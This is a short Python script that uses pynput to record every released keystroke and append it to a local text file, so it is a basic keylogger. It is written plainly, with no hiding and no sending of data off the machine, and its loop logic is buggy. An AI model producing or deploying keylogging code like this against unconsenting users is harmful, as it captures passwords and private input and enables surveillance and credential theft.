from pynput import *

def on_release(key):
    print(key)

    if key == keyboard.Key.space:
        key = " "
    elif key == keyboard.Key.enter:
        key = "\n"
    elif key == keyboard.Key.backspace:
        key = "[BACKSPACE]"
    if key == keyboard.Key.esc:
        return False
    f.write(str(key).replace("'", ""))

Listener = keyboard.Listener(on_release=on_release)
Listener.start()

while True:
    i= 0 
    f = open("file.txt", "a")
